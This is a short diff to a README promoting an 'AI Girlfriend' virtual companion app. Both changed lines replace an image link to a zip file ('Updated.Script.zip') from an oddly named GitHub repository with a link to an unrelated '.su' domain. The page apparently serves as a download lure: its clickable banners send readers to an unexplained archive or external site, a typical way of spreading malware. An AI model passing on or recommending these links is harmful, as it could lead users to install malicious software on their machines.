@@ -4,11 +4,11 @@ Discover the future of virtual companionship with **AI Girlfriend** – an advan
 
 
 [![d37a5c5eedcb00d088688f1c422630d2](https://github.com/user-attachments/assets/e8a650c7-96d9-43f3-8b78-77c849ee7217)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 
 [![image](https://github.com/user-attachments/assets/f366341e-6737-4d7d-b2e7-20a333017992)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 # 💖 AI Girlfriend – Your Ultimate Virtual AI Companion
 
